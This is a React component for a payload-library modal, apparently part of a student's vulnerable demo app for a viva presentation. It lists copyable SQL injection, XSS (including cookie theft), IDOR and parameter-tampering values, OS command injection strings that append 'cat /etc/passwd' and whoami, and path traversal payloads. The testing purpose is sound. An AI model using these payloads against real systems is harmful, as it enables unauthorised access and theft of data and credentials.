import React, { useState } from 'react';
import { useSecurity } from '../context/SecurityContext';
import { X, Sparkles, Copy, Check } from 'lucide-react';

export const PayloadLibraryModal: React.FC = () => {
  const { isPayloadModalOpen, setIsPayloadModalOpen } = useSecurity();
  const [selectedCategory, setSelectedCategory] = useState<string>('sqli');
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);

  if (!isPayloadModalOpen) return null;

  const payloadCategories = [
    { id: 'sqli', name: 'SQL Injection' },
    { id: 'xss', name: 'Cross-Site Scripting (XSS)' },
    { id: 'parameter-tampering', name: 'Parameter Tampering & IDOR' },
    { id: 'command-injection', name: 'OS Command Injection' },
    { id: 'lfi', name: 'Local File Inclusion (LFI)' }
  ];

  const payloadData: Record<string, { label: string; payload: string; description: string }[]> = {
    sqli: [
      { label: "Boolean Auth Bypass", payload: "' OR '1'='1", description: "Classic SQL boolean override evaluating WHERE condition to TRUE." },
      { label: "Admin Comment Bypass", payload: "admin' --", description: "Injects admin user and comments out remaining password logic." },
      { label: "Hash Comment Out", payload: "admin' #", description: "MySQL hash syntax for ignoring trailing query parameters." },
      { label: "UNION Data Exfiltration", payload: "1' UNION SELECT 1, credit_card, ssn FROM vault --", description: "Combines queries to exfiltrate credit cards from secondary database tables." },
      { label: "Time-Based Blind SQLi", payload: "1' AND SLEEP(5) --", description: "Forces database engine to sleep for 5 seconds to test blind SQLi." }
    ],
    xss: [
      { label: "Classic Alert Popup", payload: '<script>alert("Hacked! Session: " + document.cookie)</script>', description: "Executes inline script popups stealing active session cookies." },
      { label: "Image OnError Handler", payload: '<img src="x" onerror="alert(\'Image XSS Triggered!\')" />', description: "Bypasses basic script tag filters via HTML image error handling." },
      { label: "SVG Vector OnLoad", payload: '<svg onload="alert(\'SVG Vector XSS!\')">', description: "Uses vector graphics SVG onload attributes for script execution." },
      { label: "DOM Hover Event", payload: '<div onmouseover="alert(\'Hover XSS\')">Hover over me!</div>', description: "Executes JavaScript on user hover mouse movement." },
      { label: "Iframe Remote Script", payload: '<iframe src="javascript:alert(\'Iframe XSS!\')"></iframe>', description: "Embeds JavaScript execution inside iframe document frames." }
    ],
    'parameter-tampering': [
      { label: "Price Override Attack", payload: '"price": 10', description: "Tamper price parameter in HTTP POST request body from ₹85,000 to ₹10." },
      { label: "IDOR Confidential Access", payload: "?emp_id=999", description: "Alters URL employee ID to fetch confidential executive CEO salary slip." },
      { label: "Hidden Product Catalog ID", payload: "?id=10", description: "Direct object reference accessing unlisted VIP testing vouchers." },
      { label: "Role Escalation Parameter", payload: '"role": "Admin"', description: "Injects elevated admin role into user profile update POST body." }
    ],
    'command-injection': [
      { label: "Linux /etc/passwd Read", payload: "8.8.8.8; cat /etc/passwd", description: "Semicolon appends secondary OS shell command reading system accounts." },
      { label: "Current User Identity", payload: "8.8.8.8; whoami", description: "Executes whoami command to discover web server execution privileges." },
      { label: "Directory Listing", payload: "8.8.8.8; ls -la", description: "Lists all files in current web server directory." },
      { label: "Network Interface Config", payload: "8.8.8.8; ifconfig", description: "Retrieves internal network adapter configurations." }
    ],
    lfi: [
      { label: "Path Traversal /etc/passwd", payload: "../../../../etc/passwd", description: "Traverses root directory to read system Linux credentials." },
      { label: "Windows System File Read", payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", description: "Path traversal target for Windows OS hosts files." }
    ]
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedPayload(text);
    setTimeout(() => setCopiedPayload(null), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-md">
      <div className="flex h-[85vh] w-full max-w-4xl flex-col rounded-2xl border border-gray-800 bg-gray-950 shadow-2xl overflow-hidden font-sans">
        {/* Header */}
        <div className="flex items-center justify-between border-b border-gray-800 bg-gray-900/80 px-6 py-4">
          <div className="flex items-center gap-3">
            <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-purple-950 border border-purple-800 text-purple-400">
              <Sparkles className="h-5 w-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                Advanced Cybersecurity Attack Payload Library
              </h2>
              <p className="text-xs text-gray-400">Curated attack strings for testing application modules during viva presentation</p>
            </div>
          </div>

          <button
            onClick={() => setIsPayloadModalOpen(false)}
            className="rounded-lg p-2 text-gray-400 hover:bg-gray-800 hover:text-white transition"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Category Tabs */}
        <div className="flex border-b border-gray-800 bg-gray-900/40 px-6 py-2 gap-2 overflow-x-auto">
          {payloadCategories.map((cat) => (
            <button
              key={cat.id}
              onClick={() => setSelectedCategory(cat.id)}
              className={`px-3 py-1.5 text-xs font-semibold rounded-xl transition ${
                selectedCategory === cat.id
                  ? 'bg-purple-900/80 text-purple-200 border border-purple-700 shadow-md'
                  : 'text-gray-400 hover:bg-gray-800/60 hover:text-gray-200'
              }`}
            >
              {cat.name}
            </button>
          ))}
        </div>

        {/* Payload List */}
        <div className="flex-1 overflow-y-auto p-6 space-y-3">
          {(payloadData[selectedCategory] || []).map((item, idx) => (
            <div
              key={idx}
              className="rounded-xl border border-gray-800 bg-gray-900/70 p-4 space-y-2 hover:border-purple-800/60 transition"
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-white">{item.label}</span>
                <button
                  onClick={() => handleCopy(item.payload)}
                  className="flex items-center gap-1 text-[11px] text-purple-300 hover:text-white transition bg-gray-800 px-2.5 py-1 rounded-md border border-gray-700"
                >
                  {copiedPayload === item.payload ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                  <span>{copiedPayload === item.payload ? 'Copied!' : 'Copy Payload'}</span>
                </button>
              </div>

              <div className="rounded-lg bg-black p-2.5 font-mono text-xs text-purple-300 border border-gray-800 break-all">
                {item.payload}
              </div>

              <p className="text-xs text-gray-400">{item.description}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};
